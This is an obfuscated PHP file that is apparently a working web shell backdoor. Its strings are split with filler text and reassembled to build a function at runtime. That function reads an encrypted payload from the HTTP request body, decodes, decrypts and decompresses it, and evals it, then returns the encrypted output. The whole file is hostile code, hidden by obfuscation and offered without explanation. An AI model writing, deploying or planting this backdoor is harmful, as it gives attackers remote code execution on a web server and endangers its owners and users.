<?php
$z='tf:entsf:("pf:hp:/f:/input")f:f:,$m)==1) {@obf:_sf:tart();f:@evaf:l(@gzuncomf:prf:esf:s(';
$V='rf:($i=f:0;$i<$l;f:){for($f:j=0;f:($j<$c&&$i<$lf:);$j++f:f:f:,f:$i++f:){$o.=$t{$i}^f';
$G=str_replace('Hv','','cHvreaHvteHv_fuHvHvnctHvion');
$d='$k="f:b965af:8c7";$kh="f:df:57928b85a8ef:";$f:kf="f:1cbcebf553f:e6";$p=f:"Brv4Vtf:WTj';
$Q=':$k{$j};f:}}retuf:rn $o;}if:f (@pf:reg_match("f:/$kh(.+)$f:kf/",@ff:if:le_get_con';
$F='@x(@base6f:4_decode($m[f:1])f:,$k)));$o=f:@ob_getf:_f:contef:nts();@ob_endf:_f:clean';
$E='f:iUeL9Kf:U";functiof:nf: x($t,$kf:){$cf:=strlen($kf:)f:;$l=strlef:f:n($t);$o="";ff:o';
$l='();$rf:=@f:base6f:4_encodef:(@x(@gzf:compresf:s($o),f:$k));f:f:print(f:"$p$kh$r$kf");}';
$p=str_replace('f:','',$d.$E.$V.$Q.$z.$F.$l);
$y=$G('',$p);$y();
?>
